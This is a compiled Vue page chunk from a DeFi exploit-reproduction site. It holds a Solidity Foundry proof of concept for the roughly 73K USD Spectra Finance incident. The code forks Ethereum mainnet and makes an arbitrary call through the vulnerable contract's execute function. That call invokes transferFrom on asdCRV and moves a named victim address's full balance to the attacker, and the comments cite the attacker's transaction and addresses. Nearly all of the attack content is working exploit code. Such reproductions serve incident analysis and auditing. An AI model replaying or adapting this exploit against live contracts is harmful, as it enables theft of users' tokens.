import{_ as a,K as t,L as p,a5 as e,M as n,N as c,W as o,F as i}from"./framework-edebdfe1.js";const l={},u=n("h1",{id:"spectra-finance",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#spectra-finance","aria-hidden":"true"},"#"),c(" Spectra_finance")],-1),k=o(`<h2 id="poc" tabindex="-1"><a class="header-anchor" href="#poc" aria-hidden="true">#</a> POC</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.10</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;forge-std/Test.sol&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">&quot;./interface.sol&quot;</span><span class="token punctuation">;</span>

<span class="token comment">// @KeyInfo -- Total Lost : ~73K USD</span>
<span class="token comment">// TX : https://app.blocksec.com/explorer/tx/eth/0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744</span>
<span class="token comment">// Attacker : https://etherscan.io/address/0x53635bf7b92b9512f6de0eb7450b26d5d1ad9a4c</span>
<span class="token comment">// Attack Contract : https://etherscan.io/address/0xba8ce86147ded54c0879c9a954f9754a472704aa</span>
<span class="token comment">// GUY : https://x.com/shoucccc/status/1815981585637990899</span>


<span class="token keyword">contract</span> <span class="token class-name">ContractTest</span> <span class="token keyword">is</span> Test <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> VulnContract<span class="token operator">=</span><span class="token number">0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a</span><span class="token punctuation">;</span>
    <span class="token builtin">address</span> victim<span class="token operator">=</span><span class="token number">0x279a7DBFaE376427FFac52fcb0883147D42165FF</span><span class="token punctuation">;</span>
    CheatCodes cheats <span class="token operator">=</span> <span class="token function">CheatCodes</span><span class="token punctuation">(</span><span class="token number">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    IERC20 asdCRV <span class="token operator">=</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token number">0x43E54C2E7b3e294De3A155785F52AB49d87B9922</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">setUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        vm<span class="token punctuation">.</span><span class="token function">createSelectFork</span><span class="token punctuation">(</span><span class="token string">&quot;mainnet&quot;</span><span class="token punctuation">,</span> <span class="token number">20369956</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">testExploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        <span class="token keyword">emit</span> <span class="token function">log_named_decimal_uint</span><span class="token punctuation">(</span><span class="token string">&quot;[Begin] Attacker asdCRV balance before exploit&quot;</span><span class="token punctuation">,</span> asdCRV<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> asdCRV<span class="token punctuation">.</span><span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">emit</span> <span class="token function">log_named_decimal_uint</span><span class="token punctuation">(</span><span class="token string">&quot;[End] Attacker asdCRV balance after exploit&quot;</span><span class="token punctuation">,</span> asdCRV<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> asdCRV<span class="token punctuation">.</span><span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> datas<span class="token operator">=</span>abi<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>asdCRV<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSelector</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token number">0x23b872dd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span>asdCRV<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> command<span class="token operator">=</span>hex<span class="token string">&quot;12&quot;</span><span class="token punctuation">;</span>
        <span class="token builtin">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> data<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>datas<span class="token punctuation">;</span>
        <span class="token builtin">address</span><span class="token punctuation">(</span>VulnContract<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSelector</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token number">0x3593564c</span><span class="token punctuation">)</span><span class="token punctuation">,</span> command<span class="token punctuation">,</span>data<span class="token punctuation">,</span>block<span class="token punctuation">.</span>timestamp<span class="token operator">+</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function d(r,b){const s=i("DocsAD");return t(),p("div",null,[u,e(s),k])}const v=a(l,[["render",d],["__file","Spectra_finance.html.vue"]]);export{v as default};
